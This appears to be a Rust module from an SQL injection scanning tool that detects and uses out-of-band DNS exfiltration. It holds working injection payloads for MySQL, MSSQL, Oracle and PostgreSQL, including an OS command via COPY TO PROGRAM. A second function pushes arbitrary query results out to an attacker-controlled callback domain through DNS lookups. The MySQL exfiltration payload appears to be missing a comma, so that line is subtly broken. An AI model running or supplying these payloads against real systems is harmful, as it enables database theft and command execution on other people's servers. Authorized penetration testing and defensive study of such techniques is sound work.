//! DNS exfiltration (Out-of-Band) SQL injection

use crate::sqli::core::DBMS;
use crate::sqli::request::Request;
use anyhow::Result;
use std::time::Duration;

/// DNS/OOB injection vector
#[derive(Debug, Clone)]
pub struct DnsVector {
    pub dbms: DBMS,
    pub prefix: String,
    pub suffix: String,
    pub callback_domain: String,
}

/// Per-process nonce so each scan's DNS probes use unique sub-domains.
fn dns_nonce() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    static C: AtomicU64 = AtomicU64::new(0);
    let n = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    let s = C.fetch_add(1, Ordering::Relaxed);
    format!("{:x}{:x}", n, s)
}

/// Check for DNS exfiltration: inject DBMS-specific payloads that force an
/// outbound DNS lookup to `<id>.<callback_domain>`, then poll the shared OOB
/// interaction log (populated by the built-in DNS listener). A recorded lookup
/// for one of our unique ids confirms out-of-band SQLi and reveals the DBMS.
///
/// Requires the built-in DNS listener to be running and `callback_domain` to be
/// delegated to it (NS record pointing at the listener's host).
pub async fn check_dns_exfiltration(
    request: &Request<'_>,
    callback_domain: &str,
) -> Result<Option<DnsVector>> {
    let nonce = dns_nonce();
    // (dbms, unique id sub-label, payload forcing a DNS lookup to id.domain)
    let probes = [
        (
            DBMS::MySQL,
            format!("my{}", nonce),
            format!(
                "1 AND LOAD_FILE(CONCAT('\\\\\\\\','my{}.{}','\\\\a'))-- -",
                nonce, callback_domain
            ),
        ),
        (
            DBMS::MSSQL,
            format!("ms{}", nonce),
            format!(
                "1; EXEC master..xp_dirtree '\\\\\\\\ms{}.{}\\\\a'-- -",
                nonce, callback_domain
            ),
        ),
        (
            DBMS::Oracle,
            format!("or{}", nonce),
            format!(
                "1 AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('or{}.{}') FROM dual) IS NOT NULL-- -",
                nonce, callback_domain
            ),
        ),
        (
            DBMS::PostgreSQL,
            format!("pg{}", nonce),
            format!(
                "1; COPY (SELECT '') TO PROGRAM 'nslookup pg{}.{}'-- -",
                nonce, callback_domain
            ),
        ),
    ];

    for (_, _, payload) in &probes {
        let _ = request.query_page(payload).await;
    }

    // Poll the shared OOB log; a DNS lookup for one of our ids is proof.
    for _ in 0..20 {
        for (dbms, id, _) in &probes {
            if crate::ssrf::oob::oob_was_hit(id) {
                return Ok(Some(DnsVector {
                    dbms: *dbms,
                    prefix: "1".to_string(),
                    suffix: "-- -".to_string(),
                    callback_domain: callback_domain.to_string(),
                }));
            }
        }
        tokio::time::sleep(Duration::from_millis(300)).await;
    }

    Ok(None)
}

/// Execute DNS exfiltration query
pub async fn dns_use(
    request: &Request<'_>,
    vector: &DnsVector,
    query: &str,
) -> Result<()> {
    let payload = match vector.dbms {
        DBMS::MySQL => {
            format!(
                "{} AND LOAD_FILE(CONCAT('\\\\\\\\',({}),'.','{}'.'\\\\a')){}",
                vector.prefix, query, vector.callback_domain, vector.suffix
            )
        },
        DBMS::MSSQL => {
            format!(
                "{}; DECLARE @q VARCHAR(8000);SET @q=({});EXEC master..xp_dirtree '\\\\\\\\'+@q+'.{}.\\\\a'{}",
                vector.prefix, query, vector.callback_domain, vector.suffix
            )
        },
        _ => return Ok(()),
    };
    
    let _ = request.query_page(&payload).await?;
    Ok(())
}
